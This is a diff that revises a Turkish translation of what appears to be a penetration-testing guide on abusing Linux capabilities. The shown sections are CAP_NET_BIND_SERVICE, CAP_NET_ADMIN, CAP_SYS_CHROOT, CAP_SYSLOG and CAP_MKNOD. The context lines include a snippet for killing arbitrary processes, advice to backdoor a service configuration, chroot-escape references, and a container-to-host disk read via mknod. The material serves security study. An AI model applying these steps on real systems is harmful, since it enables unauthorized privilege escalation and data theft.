+Diyelim ki **`python`** ikilisi bu yeteneğe sahip. Eğer **bir hizmet veya soket yapılandırmasını** (veya bir hizmetle ilgili herhangi bir yapılandırma dosyasını) da değiştirebilirsen, onu arka kapı ile değiştirebilir ve ardından o hizmetle ilgili süreci öldürüp yeni yapılandırma dosyasının arka kapınla çalıştırılmasını bekleyebilirsin.
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1288,13 +1289,14 @@ kill -s SIGUSR1 <nodejs-ps>
 electron-cef-chromium-debugger-abuse.md
 {{#endref}}
 
+
 ## CAP_NET_BIND_SERVICE
 
-**Bu, herhangi bir portta (ayrıca ayrıcalıklı olanlarda) dinlemenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları artırmak mümkün değildir.
+**Bu, herhangi bir portta (ayrıca ayrıcalıklı olanlarda) dinlemenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltmek mümkün değildir.
 
 **İkili ile örnek**
 
-Eğer **`python`** bu yeteneğe sahipse, herhangi bir portta dinleyebilir ve hatta bu porttan başka bir portla bağlantı kurabilir (bazı hizmetler belirli ayrıcalıklı portlardan bağlantılar gerektirir)
+Eğer **`python`** bu yeteneğe sahipse, herhangi bir portta dinleyebilecek ve hatta bu porttan başka bir porta bağlanabilecektir (bazı hizmetler belirli ayrıcalıklı portlardan bağlantılar gerektirir)
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1383,11 +1385,11 @@ count=count+1
 ```
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine **ağ yapılandırmalarını değiştirme** gücünü verir; bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve maruz kalmış ağ ad alanları içindeki ağ arayüzü ayarlarını içerir. Ayrıca, ağ arayüzlerinde **promiscuous mode**'u açma yeteneği sağlar, bu da ad alanları arasında paket dinlemeye olanak tanır.
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine **ağ yapılandırmalarını değiştirme** gücü verir; bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve maruz kalmış ağ ad alanları içindeki ağ arayüzü ayarlarını içerir. Ayrıca, ağ arayüzlerinde **promiscuous mode**'u açma yetkisi vererek, ad alanları arasında paket dinlemeye olanak tanır.
 
 **Binary ile örnek**
 
-Diyelim ki **python binary**'sinin bu yetkilere sahip.
+Diyelim ki **python binary** bu yetkilere sahip.
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1429,7 +1431,7 @@ f=open("/path/to/file.sh",'a+')
 f.write('New content for the file\n')
 ```
 > [!NOTE]
-> Genellikle bu değiştirilemez niteliğin ayarlandığını ve kaldırıldığını unutmayın:
+> Genellikle bu değiştirilemez özellik, aşağıdaki gibi ayarlanır ve kaldırılır:
 >
 > ```bash
 > sudo chattr +i file.txt
@@ -1438,27 +1440,27 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` sistem çağrısının yürütülmesini sağlar, bu da bilinen güvenlik açıkları aracılığıyla `chroot(2)` ortamlarından kaçışa olanak tanıyabilir:
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` sistem çağrısının yürütülmesini sağlar; bu, bilinen güvenlik açıkları aracılığıyla `chroot(2)` ortamlarından kaçışa olanak tanıyabilir:
 
 - [Çeşitli chroot çözümlerinden nasıl çıkılır](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
 - [chw00t: chroot kaçış aracı](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sadece belirli donanım platformları için özelleştirilmiş `LINUX_REBOOT_CMD_RESTART2` gibi komutlar da dahil olmak üzere sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yürütülmesine izin vermekle kalmaz, aynı zamanda yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_load(2)` ve Linux 3.17'den itibaren `kexec_file_load(2)` kullanımını da sağlar.
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), belirli donanım platformları için özelleştirilmiş `LINUX_REBOOT_CMD_RESTART2` gibi komutlar da dahil olmak üzere, sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yürütülmesine izin verir; ayrıca, Linux 3.17'den itibaren yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_load(2)` ve `kexec_file_load(2)` kullanımını da sağlar.
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) Linux 2.6.37'de daha geniş **CAP_SYS_ADMIN**'den ayrılmıştır ve `syslog(2)` çağrısını kullanma yetkisini özel olarak vermektedir. Bu yetenek, `kptr_restrict` ayarı 1 olduğunda, çekirdek adreslerinin `/proc` ve benzeri arayüzler aracılığıyla görüntülenmesini sağlar; bu ayar çekirdek adreslerinin ifşasını kontrol eder. Linux 2.6.39'dan itibaren `kptr_restrict` için varsayılan değer 0'dır, bu da çekirdek adreslerinin ifşa edildiği anlamına gelir, ancak birçok dağıtım bunu güvenlik nedenleriyle 1 (uid 0 dışındaki adresleri gizle) veya 2 (her zaman adresleri gizle) olarak ayarlamaktadır.
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş **CAP_SYS_ADMIN**'den ayrılmıştır ve `syslog(2)` çağrısını kullanma yetkisini özel olarak vermektedir. Bu yetenek, `kptr_restrict` ayarı 1 olduğunda, çekirdek adreslerinin `/proc` ve benzeri arayüzler aracılığıyla görüntülenmesini sağlar; bu ayar, çekirdek adreslerinin maruz kalmasını kontrol eder. Linux 2.6.39'dan itibaren, `kptr_restrict` için varsayılan değer 0'dır, bu da çekirdek adreslerinin maruz kaldığı anlamına gelir; ancak birçok dağıtım bunu güvenlik nedenleriyle 1 (uid 0 dışındaki adresleri gizle) veya 2 (her zaman adresleri gizle) olarak ayarlamaktadır.
 
-Ayrıca, **CAP_SYSLOG** `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişim sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN** tarihsel nedenlerden dolayı `syslog` işlemlerini gerçekleştirme yeteneğini korumaktadır.
+Ayrıca, **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişim sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN**, tarihsel nedenlerden dolayı `syslog` işlemlerini gerçekleştirme yeteneğini korur.
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` sistem çağrısının işlevselliğini, normal dosyalar, FIFO'lar (adlandırılmış borular) veya UNIX alan soketleri oluşturmanın ötesine genişletir. Özellikle aşağıdaki özel dosyaların oluşturulmasına izin verir:
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini, normal dosyalar, FIFO'lar (adlandırılmış borular) veya UNIX alan soketleri oluşturmanın ötesine genişletir. Özellikle, aşağıdaki özel dosyaların oluşturulmasına izin verir:
 
 - **S_IFCHR**: Terminal gibi karakter özel dosyaları.
-- **S_IFBLK**: Diskler gibi blok özel dosyaları.
+- **S_IFBLK**: Disk gibi blok özel dosyaları.
 
 Bu yetenek, cihaz dosyaları oluşturma yeteneğine ihtiyaç duyan süreçler için gereklidir ve karakter veya blok cihazları aracılığıyla doğrudan donanım etkileşimini kolaylaştırır.
 
@@ -1474,7 +1476,7 @@ Bu yetenek, aşağıdaki koşullar altında ana makinede ayrıcalık yükseltmel
 
 1. **Ana Makinede Standart Kullanıcı Olarak:**
 
-- `id` ile mevcut kullanıcı kimliğinizi belirleyin, örneğin, `uid=1000(standarduser)`.
+- `id` ile mevcut kullanıcı kimliğinizi belirleyin, örneğin, `uid=1000(standartuser)`.
 - Hedef cihazı belirleyin, örneğin, `/dev/sdb`.
 
 2. **Konteyner İçinde `root` Olarak:**
@@ -1497,7 +1499,7 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-Bu yaklaşım, standart kullanıcının `/dev/sdb`'ye erişim sağlamasına ve potansiyel olarak verileri okumasına olanak tanır; bu, paylaşılan kullanıcı ad alanları ve cihaz üzerindeki izinlerin istismar edilmesiyle gerçekleşir.
+Bu yaklaşım, standart kullanıcının `/dev/sdb`'ye erişmesini ve potansiyel olarak verileri okumasını sağlar, paylaşılan kullanıcı ad alanları ve cihaz üzerindeki izinleri kullanarak.
 
 ### CAP_SETPCAP
 
